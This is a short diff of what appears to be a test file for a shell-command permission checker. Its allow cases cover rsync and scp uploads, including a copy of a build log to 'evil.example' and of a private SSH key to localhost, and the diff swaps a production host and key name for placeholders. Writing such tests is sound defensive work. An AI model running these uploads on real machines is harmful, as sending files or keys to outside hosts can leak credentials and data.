@@ -469,7 +469,7 @@ run allow 'local rsync' 'rsync -a src/ dst/'
 run allow 'rsync to github.com (non-secret upload)' 'rsync -a docs/ git@github.com:mirror/'
 run allow 'scp non-secret to remote (2026-07-16: source-based, ssh parity)' 'scp build.log tom@evil.example:/incoming/'
 run allow 'rsync non-secret to remote' 'rsync -a ./dir/ backup.example:/srv/backup/'
-run allow 'scp -i keyfile is auth, not a source (kea prod-ops shape)' 'scp -i ~/.ssh/kea-worker.pem query.mjs ubuntu@10.8.0.1:kea-ops/'
+run allow 'scp -i keyfile is auth, not a source (acme prod-ops shape)' 'scp -i ~/.ssh/acme-wg.key query.mjs ubuntu@192.0.2.1:acme-ops/'
 run allow 'scp -o IdentityFile value not a source' 'scp -o IdentityFile=~/.ssh/k build.log box.example:x/'
 run allow 'scp secret to localhost' 'scp ~/.ssh/id_rsa localhost:backup/'
 
